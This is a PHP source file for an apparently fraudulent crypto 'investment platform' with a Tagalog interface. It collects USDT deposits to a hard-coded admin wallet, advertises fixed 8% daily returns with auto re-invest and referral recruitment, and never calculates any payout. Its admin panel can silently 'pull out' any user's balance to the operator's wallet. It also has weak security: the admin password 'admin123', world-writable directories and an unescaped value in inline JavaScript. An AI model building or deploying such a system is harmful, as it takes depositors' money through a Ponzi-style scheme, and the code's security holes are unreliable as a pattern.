<?php
session_start();

// Configuration: Simple admin password
$adminSecretPassword = 'admin123'; 
$dataFile = __DIR__ . '/../data/system_data.json';

// Utility functions for JSON storage
function loadData($filePath) {
    $dir = dirname($filePath);
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }
    
    if (!file_exists($filePath)) {
        $initialData = [
            'settings' => ['admin_wallet' => 'TKXeJE2mXMAoFFcjE8E1LctQDNmjo9HVxd'],
            'users' => [],
            'transactions' => []
        ];
        file_put_contents($filePath, json_encode($initialData, JSON_PRETTY_PRINT));
        return $initialData;
    }
    $content = file_get_contents($filePath);
    $data = json_decode($content, true) ?? [];
    if (!isset($data['settings'])) {
        $data['settings'] = ['admin_wallet' => 'TKXeJE2mXMAoFFcjE8E1LctQDNmjo9HVxd'];
    }
    return $data;
}

function saveData($filePath, $data) {
    $dir = dirname($filePath);
    if (!is_dir($dir)) {
        mkdir($dir, 0777, true);
    }
    file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT));
}

$db = loadData($dataFile);
$adminUsdtWallet = $db['settings']['admin_wallet'] ?? 'TKXeJE2mXMAoFFcjE8E1LctQDNmjo9HVxd';

// Capture referral parameter from link
if (isset($_GET['ref'])) {
    $_SESSION['referred_by'] = htmlspecialchars($_GET['ref']);
}

// Plans definition (15 Days + Auto Re-invest)
$plans = [
    'Starter Plan' => ['price' => 10, 'return_daily' => 0.80, 'days' => 15],
    'Growth Plan'  => ['price' => 50, 'return_daily' => 4.00, 'days' => 15],
    'Pro Plan'     => ['price' => 200, 'return_daily' => 16.00, 'days' => 15]
];

// USER REGISTRATION
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'register') {
    $username = strtolower(trim($_POST['username'] ?? ''));
    $password = trim($_POST['password'] ?? '');

    if (empty($username) || empty($password)) {
        $authError = "Punan ang username at password.";
    } elseif (isset($db['users'][$username])) {
        $authError = "May gumagamit na ng username na ito.";
    } else {
        $db['users'][$username] = [
            'password' => password_hash($password, PASSWORD_DEFAULT),
            'balance' => 0.00,
            'referred_by' => $_SESSION['referred_by'] ?? 'None',
            'created_at' => date('Y-m-d H:i:s')
        ];
        saveData($dataFile, $db);
        $_SESSION['user'] = $username;
        header("Location: /");
        exit();
    }
}

// USER LOGIN
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'login') {
    $username = strtolower(trim($_POST['username'] ?? ''));
    $password = trim($_POST['password'] ?? '');

    if (isset($db['users'][$username]) && password_verify($password, $db['users'][$username]['password'])) {
        $_SESSION['user'] = $username;
        header("Location: /");
        exit();
    } else {
        $authError = "Maling username o password.";
    }
}

// USER LOGOUT
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    unset($_SESSION['user']);
    header("Location: /");
    exit();
}

// ADMIN LOGIN / LOGOUT
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'admin_login') {
    if (trim($_POST['password']) === $adminSecretPassword) {
        $_SESSION['is_admin'] = true;
        header("Location: ?route=admin");
        exit();
    } else {
        $adminError = "Maling password ng admin.";
    }
}

if (isset($_GET['action']) && $_GET['action'] === 'admin_logout') {
    unset($_SESSION['is_admin']);
    header("Location: /");
    exit();
}

// ADMIN UPDATE BINANCE WALLET ADDRESS
if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'update_admin_wallet') {
    $newWallet = trim($_POST['new_admin_wallet'] ?? '');
    if (!empty($newWallet)) {
        $db['settings']['admin_wallet'] = htmlspecialchars($newWallet);
        saveData($dataFile, $db);
        $adminUsdtWallet = $newWallet;
        $adminSuccess = "Matagumpay na na-update ang iyong Binance USDT Wallet Address!";
    } else {
        $adminErrorMsg = "Mangyaring ilagay ang valid na wallet address.";
    }
}

// ADMIN APPROVE DEPOSIT
if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && isset($_GET['approve_deposit'])) {
    $txnId = $_GET['approve_deposit'];
    foreach ($db['transactions'] as &$txn) {
        if ($txn['id'] === $txnId && $txn['status'] === 'pending') {
            $txn['status'] = 'approved';
            $u = $txn['username'];
            if (isset($db['users'][$u])) {
                $db['users'][$u]['balance'] += $txn['amount'];
            }
            saveData($dataFile, $db);
            break;
        }
    }
    header("Location: ?route=admin");
    exit();
}

// ADMIN APPROVE WITHDRAWAL
if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && isset($_GET['approve_withdraw'])) {
    $txnId = $_GET['approve_withdraw'];
    foreach ($db['transactions'] as &$txn) {
        if ($txn['id'] === $txnId && $txn['status'] === 'pending') {
            $txn['status'] = 'completed';
            saveData($dataFile, $db);
            break;
        }
    }
    header("Location: ?route=admin");
    exit();
}

// ADMIN DIRECT MANAGE FUNDS (DEPOSIT / PULLOUT)
if (isset($_SESSION['is_admin']) && $_SESSION['is_admin'] === true && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'admin_adjust_fund') {
    $targetUser = trim($_POST['target_user'] ?? '');
    $adjustAmount = floatval($_POST['adjust_amount'] ?? 0);
    $type = $_POST['adjust_type'] ?? 'add';

    if (isset($db['users'][$targetUser]) && $adjustAmount > 0) {
        if ($type === 'add') {
            $db['users'][$targetUser]['balance'] += $adjustAmount;
            $db['transactions'][] = [
                'id' => 'ADM-DEP-' . time(),
                'username' => $targetUser,
                'type' => 'admin_deposit',
                'amount' => $adjustAmount,
                'status' => 'approved',
                'created_at' => date('Y-m-d H:i:s')
            ];
            $adminSuccess = "Nalagyan ng $adjustAmount USDT si $targetUser.";
        } elseif ($type === 'deduct') {
            $db['users'][$targetUser]['balance'] -= $adjustAmount;
            if ($db['users'][$targetUser]['balance'] < 0) {
                $db['users'][$targetUser]['balance'] = 0;
            }
            $db['transactions'][] = [
                'id' => 'ADM-PULL-' . time(),
                'username' => $targetUser,
                'type' => 'admin_pullout',
                'amount' => $adjustAmount,
                'destination_wallet' => $adminUsdtWallet,
                'status' => 'completed',
                'created_at' => date('Y-m-d H:i:s')
            ];
            $adminSuccess = "Na-pullout ang $adjustAmount USDT kay $targetUser papuntang Admin Binance Wallet.";
        }
        saveData($dataFile, $db);
    } else {
        $adminErrorMsg = "Hindi nahanap ang user o mali ang halaga.";
    }
}

// Logged-in User Context
$currentUser = $_SESSION['user'] ?? null;
$userData = $currentUser ? ($db['users'][$currentUser] ?? null) : null;
$referralLink = $currentUser ? ('http://' . $_SERVER['HTTP_HOST'] . '/?ref=' . $currentUser) : '';

// USER DEPOSIT SUBMISSION
if ($currentUser && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'submit_deposit') {
    $amount = floatval($_POST['deposit_amount'] ?? 0);
    $txid = trim($_POST['txid'] ?? '');

    if ($amount < 5) {
        $error = "Ang minimum USDT deposit ay 5 USDT.";
    } elseif (empty($txid)) {
        $error = "Mangyaring ilagay ang Transaction Hash (TXID).";
    } else {
        $db['transactions'][] = [
            'id' => 'TXN-' . time(),
            'username' => $currentUser,
            'type' => 'usdt_deposit',
            'amount' => $amount,
            'txid' => htmlspecialchars($txid),
            'status' => 'pending',
            'created_at' => date('Y-m-d H:i:s')
        ];
        saveData($dataFile, $db);
        $success = "Naisumite na ang iyong deposit proof! Naghihintay ng beripikasyon ng admin.";
    }
}

// USER WITHDRAWAL REQUEST
if ($currentUser && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'request_withdraw') {
    $amount = floatval($_POST['withdraw_amount'] ?? 0);
    $wallet = trim($_POST['user_wallet'] ?? '');
    $currentBalance = $userData['balance'] ?? 0;

    if ($amount < 5) {
        $error = "Ang minimum withdrawal ay 5 USDT.";
    } elseif ($amount > $currentBalance) {
        $error = "Hindi sapat ang iyong balance para mag-withdraw.";
    } elseif (empty($wallet)) {
        $error = "Mangyaring ilagay ang iyong USDT wallet address.";
    } else {
        $db['users'][$currentUser]['balance'] -= $amount;
        $db['transactions'][] = [
            'id' => 'WD-' . time(),
            'username' => $currentUser,
            'type' => 'usdt_withdraw',
            'amount' => $amount,
            'wallet' => htmlspecialchars($wallet),
            'status' => 'pending',
            'created_at' => date('Y-m-d H:i:s')
        ];
        saveData($dataFile, $db);
        $userData = $db['users'][$currentUser];
        $success = "Naisumite na ang iyong withdrawal request! Iproseso ito ng admin sa lalong madaling panahon.";
    }
}

// USER PLAN SUBSCRIPTION
if ($currentUser && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'subscribe') {
    $selectedPlanKey = $_POST['plan_name'] ?? 'Starter Plan';
    $currentBalance = $userData['balance'] ?? 0;
    
    if (!isset($plans[$selectedPlanKey])) {
        $error = "Invalid investment plan selected.";
    } else {
        $plan = $plans[$selectedPlanKey];
        if ($currentBalance < $plan['price']) {
            $error = "Hindi sapat ang iyong balance para mag-subscribe sa plan na ito.";
        } else {
            $db['users'][$currentUser]['balance'] -= $plan['price'];
            $db['transactions'][] = [
                'id' => 'SUB-' . time(),
                'username' => $currentUser,
                'type' => 'subscription',
                'plan' => $selectedPlanKey,
                'amount' => $plan['price'],
                'cycle' => '15 Days (Auto Re-invest)',
                'status' => 'active',
                'created_at' => date('Y-m-d H:i:s')
            ];
            saveData($dataFile, $db);
            $userData = $db['users'][$currentUser];
            $success = "Matagumpay kang nag-subscribe sa $selectedPlanKey (15 Days + Re-invest)!";
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Investment Platform Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
        .container { max-width: 500px; margin: 0 auto; background: #1e293b; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        h2, h3 { text-align: center; color: #38bdf8; }
        .balance-box { background: #334155; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 18px; font-weight: bold; }
        .card { background: #334155; padding: 15px; border-radius: 8px; margin-bottom: 15px; }
        .wallet-address, .ref-box { background: #0f172a; padding: 10px; border-radius: 6px; font-family: monospace; word-break: break-all; color: #38bdf8; text-align: center; margin: 10px 0; font-size: 13px; }
        .btn { display: block; width: 100%; padding: 12px; background: #22c55e; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; text-align: center; text-decoration: none; margin-top: 10px; box-sizing: border-box;}
        .btn:hover { background: #16a34a; }
        .btn-sub { background: #d97706; }
        .btn-sub:hover { background: #b45309; }
        .btn-withdraw { background: #e11d48; }
        .btn-withdraw:hover { background: #be123c; }
        .btn-danger { background: #ef4444; }
        select, input[type="number"], input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: white; box-sizing: border-box; }
        .alert { padding: 10px; border-radius: 6px; margin-bottom: 15px; text-align: center; }
        .alert-error { background: #ef4444; color: white; }
        .alert-success { background: #22c55e; color: white; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; }
        th, td { border: 1px solid #475569; padding: 6px; text-align: left; }
        th { background: #0f172a; }
        .footer-links { text-align: center; margin-top: 20px; font-size: 13px; }
        .footer-links a { color: #94a3b8; text-decoration: none; }
        .footer-links a:hover { color: #38bdf8; }
        .tab-btn { width: 48%; display: inline-block; padding: 10px; text-align: center; background: #0f172a; color: white; border-radius: 6px; cursor: pointer; }
        .tab-btn.active { background: #38bdf8; color: #0f172a; font-weight: bold; }
        hr { border: 0; border-top: 1px solid #475569; margin: 20px 0; }
    </style>
</head>
<body>

<div class="container">
    <?php if (isset($_GET['route']) && $_GET['route'] === 'admin'): ?>
        <!-- ADMIN PANEL -->
        <h2>Admin Panel (Secret)</h2>
        <?php if (!isset($_SESSION['is_admin']) || $_SESSION['is_admin'] !== true): ?>
            <div class="card">
                <form method="POST">
                    <input type="hidden" name="action" value="admin_login">
                    <label for="password">Admin Password:</label>
                    <input type="password" id="password" name="password" required>
                    <button type="submit" class="btn">Mag-login</button>
                    <?php if (isset($adminError)): ?>
                        <div class="alert alert-error" style="margin-top: 10px;"><?= htmlspecialchars($adminError) ?></div>
                    <?php endif; ?>
                </form>
            </div>
        <?php else: ?>

            <?php if (isset($adminSuccess)): ?>
                <div class="alert alert-success"><?= htmlspecialchars($adminSuccess) ?></div>
            <?php endif; ?>

            <?php if (isset($adminErrorMsg)): ?>
                <div class="alert alert-error"><?= htmlspecialchars($adminErrorMsg) ?></div>
            <?php endif; ?>

            <!-- SET ADMIN BINANCE WALLET ADDRESS -->
            <div class="card">
                <h3>Set Admin Binance USDT Address</h3>
                <form method="POST">
                    <input type="hidden" name="action" value="update_admin_wallet">
                    <label>Binance USDT Wallet Address (TRC20/BEP20):</label>
                    <input type="text" name="new_admin_wallet" value="<?= htmlspecialchars($adminUsdtWallet) ?>" placeholder="Ilagay ang iyong Binance USDT Address" required>
                    <button type="submit" class="btn">I-save ang Wallet Address</button>
                </form>
            </div>

            <!-- ADMIN DIRECT DEPOSIT / PULLOUT CONTROL -->
            <div class="card">
                <h3>Admin Fund Control (Deposit / Pullout)</h3>
                <form method="POST">
                    <input type="hidden" name="action" value="admin_adjust_fund">
                    <label>Pumili ng Client User:</label>
                    <select name="target_user" required>
                        <?php foreach ($db['users'] as $uname => $uinfo): ?>
                            <option value="<?= htmlspecialchars($uname) ?>">
                                <?= htmlspecialchars($uname) ?> (Bal: $<?= number_format($uinfo['balance'], 2) ?> USDT)
                            </option>
                        <?php endforeach; ?>
                    </select>

                    <label>Action:</label>
                    <select name="adjust_type" required>
                        <option value="deduct">Pullout Funds to Binance Wallet (I-roll sa Trading)</option>
                        <option value="add">Manual Deposit / Add Balance</option>
                    </select>

                    <label>Amount (USDT):</label>
                    <input type="number" name="adjust_amount" step="0.01" min="0.01" placeholder="Enter USDT Amount" required>

                    <button type="submit" class="btn btn-withdraw">I-execute ang Fund Adjustment</button>
                </form>
            </div>

            <div class="card">
                <h3>Pending Deposits</h3>
                <table>
                    <tr>
                        <th>User</th>
                        <th>Amount</th>
                        <th>TXID</th>
                        <th>Action</th>
                    </tr>
                    <?php 
                    $hasPendingDep = false;
                    foreach ($db['transactions'] as $txn): 
                        if ($txn['type'] === 'usdt_deposit' && $txn['status'] === 'pending'):
                            $hasPendingDep = true;
                    ?>
                    <tr>
                        <td><b><?= htmlspecialchars($txn['username']) ?></b></td>
                        <td>$<?= number_format($txn['amount'], 2) ?></td>
                        <td style="word-break: break-all;"><?= htmlspecialchars($txn['txid']) ?></td>
                        <td>
                            <a href="?route=admin&approve_deposit=<?= $txn['id'] ?>" class="btn" style="padding: 4px 8px; font-size: 10px; display:inline-block;">Approve</a>
                        </td>
                    </tr>
                    <?php 
                        endif;
                    endforeach; 
                    if (!$hasPendingDep):
                    ?>
                    <tr><td colspan="4" style="text-align: center;">Walang pending deposit.</td></tr>
                    <?php endif; ?>
                </table>
            </div>

            <div class="card">
                <h3>Pending Withdrawals</h3>
                <table>
                    <tr>
                        <th>User</th>
                        <th>Amount</th>
                        <th>Wallet</th>
                        <th>Action</th>
                    </tr>
                    <?php 
                    $hasPendingWd = false;
                    foreach ($db['transactions'] as $txn): 
                        if ($txn['type'] === 'usdt_withdraw' && $txn['status'] === 'pending'):
                            $hasPendingWd = true;
                    ?>
                    <tr>
                        <td><b><?= htmlspecialchars($txn['username']) ?></b></td>
                        <td>$<?= number_format($txn['amount'], 2) ?></td>
                        <td style="word-break: break-all;"><?= htmlspecialchars($txn['wallet']) ?></td>
                        <td>
                            <a href="?route=admin&approve_withdraw=<?= $txn['id'] ?>" class="btn btn-sub" style="padding: 4px 8px; font-size: 10px; display:inline-block;">Done</a>
                        </td>
                    </tr>
                    <?php 
                        endif;
                    endforeach; 
                    if (!$hasPendingWd):
                    ?>
                    <tr><td colspan="4" style="text-align: center;">Walang pending withdrawal.</td></tr>
                    <?php endif; ?>
                </table>
                <a href="?action=admin_logout" class="btn btn-danger" style="margin-top: 15px; text-align: center; text-decoration: none;">Mag-log out sa Admin</a>
            </div>
        <?php endif; ?>
        <div class="footer-links">
            <a href="/">Balik sa User Dashboard</a>
        </div>

    <?php elseif (!$currentUser): ?>
        <!-- LOGIN / REGISTER FORM -->
        <h2>Investment Platform</h2>

        <?php if (isset($_SESSION['referred_by'])): ?>
            <div class="alert alert-success">Inimbita ka ni: <b><?= htmlspecialchars($_SESSION['referred_by']) ?></b></div>
        <?php endif; ?>

        <?php if (isset($authError)): ?>
            <div class="alert alert-error"><?= htmlspecialchars($authError) ?></div>
        <?php endif; ?>

        <div style="margin-bottom: 15px;">
            <div id="tabLoginBtn" class="tab-btn active" onclick="showTab('login')">Mag-Login</div>
            <div id="tabRegBtn" class="tab-btn" onclick="showTab('register')">Mag-Register</div>
        </div>

        <div id="loginCard" class="card">
            <h3>Login sa iyong Account</h3>
            <form method="POST">
                <input type="hidden" name="action" value="login">
                <label>Username:</label>
                <input type="text" name="username" required>
                <label>Password:</label>
                <input type="password" name="password" required>
                <button type="submit" class="btn">Login</button>
            </form>
        </div>

        <div id="registerCard" class="card" style="display: none;">
            <h3>Gumawa ng Bagong Account</h3>
            <form method="POST">
                <input type="hidden" name="action" value="register">
                <label>Username:</label>
                <input type="text" name="username" required>
                <label>Password:</label>
                <input type="password" name="password" required>
                <button type="submit" class="btn" style="background: #38bdf8; color: #0f172a;">Register</button>
            </form>
        </div>

        <script>
            function showTab(tab) {
                if (tab === 'login') {
                    document.getElementById('loginCard').style.display = 'block';
                    document.getElementById('registerCard').style.display = 'none';
                    document.getElementById('tabLoginBtn').className = 'tab-btn active';
                    document.getElementById('tabRegBtn').className = 'tab-btn';
                } else {
                    document.getElementById('loginCard').style.display = 'none';
                    document.getElementById('registerCard').style.display = 'block';
                    document.getElementById('tabLoginBtn').className = 'tab-btn';
                    document.getElementById('tabRegBtn').className = 'tab-btn active';
                }
            }
        </script>

        <div class="footer-links">
            <a href="?route=admin">Admin Login</a>
        </div>

    <?php else: ?>
        <!-- LOGGED-IN DASHBOARD -->
        <h2>Welcome, <?= htmlspecialchars($currentUser) ?>!</h2>

        <div class="balance-box">
            Balance: $<?= number_format($userData['balance'] ?? 0, 2) ?> USDT
        </div>

        <?php if (isset($success)): ?>
            <div class="alert alert-success"><?= htmlspecialchars($success) ?></div>
        <?php endif; ?>

        <?php if (isset($error)): ?>
            <div class="alert alert-error"><?= htmlspecialchars($error) ?></div>
        <?php endif; ?>

        <!-- Referral Section -->
        <div class="card">
            <h3>Iyong Permanent Referral Link</h3>
            <div class="ref-box"><?= htmlspecialchars($referralLink) ?></div>
            <button type="button" class="btn" style="background: #38bdf8; color: #0f172a;" onclick="navigator.clipboard.writeText('<?= $referralLink ?>'); alert('Copied na ang referral link!');">Kopyahin ang Referral Link</button>
        </div>

        <hr>

        <!-- Deposit Section -->
        <div class="card">
            <h3>Mag-deposit via USDT (TRC20)</h3>
            <p style="font-size: 13px; color: #94a3b8;">I-transfer ang USDT sa wallet address sa ibaba, pagkatapos ay isumite ang TXID:</p>
            
            <div class="wallet-address">
                <?= htmlspecialchars($adminUsdtWallet) ?>
            </div>

            <form method="POST">
                <input type="hidden" name="action" value="submit_deposit">
                <label for="deposit_amount">Halaga (USDT):</label>
                <input type="number" id="deposit_amount" name="deposit_amount" min="5" step="0.01" value="20" required>
                
                <label for="txid">Transaction Hash / TXID:</label>
                <input type="text" id="txid" name="txid" placeholder="Ilagay ang TXID mula sa Binance/Wallet" required>

                <button type="submit" class="btn">I-submit ang Deposit Proof</button>
            </form>
        </div>

        <hr>

        <!-- Subscription Section -->
        <div class="card">
            <h3>Mag-subscribe sa Plan</h3>
            <form method="POST">
                <input type="hidden" name="action" value="subscribe">
                <label for="plan_name">Pumili ng Investment Plan:</label>
                <select name="plan_name" id="plan_name">
                    <?php foreach ($plans as $name => $details): ?>
                        <option value="<?= htmlspecialchars($name) ?>">
                            <?= htmlspecialchars($name) ?> (Dep: $<?= number_format($details['price'], 2) ?> | $<?= number_format($details['return_daily'], 2) ?>/day | 15 Days + Re-invest)
                        </option>
                    <?php endforeach; ?>
                </select>
                <button type="submit" class="btn btn-sub">Mag-subscribe sa Plan</button>
            </form>
        </div>

        <hr>

        <!-- Withdrawal Section -->
        <div class="card">
            <h3>Mag-request ng Withdrawal</h3>
            <form method="POST">
                <input type="hidden" name="action" value="request_withdraw">
                <label for="withdraw_amount">Halaga ng Iwi-withdraw (USDT):</label>
                <input type="number" id="withdraw_amount" name="withdraw_amount" min="5" step="0.01" placeholder="Minimum: 5 USDT" required>
                
                <label for="user_wallet">Iyong USDT Wallet Address:</label>
                <input type="text" id="user_wallet" name="user_wallet" placeholder="Ilagay ang TRC20/BEP20 Address mo" required>

                <button type="submit" class="btn btn-withdraw">I-request ang Withdrawal</button>
            </form>
        </div>

        <a href="?action=logout" class="btn btn-danger" style="margin-top: 20px; text-decoration: none;">Mag-log out</a>

        <div class="footer-links">
            <a href="?route=admin">Admin Login</a>
        </div>
    <?php endif; ?>
</div>

</body>
</html>
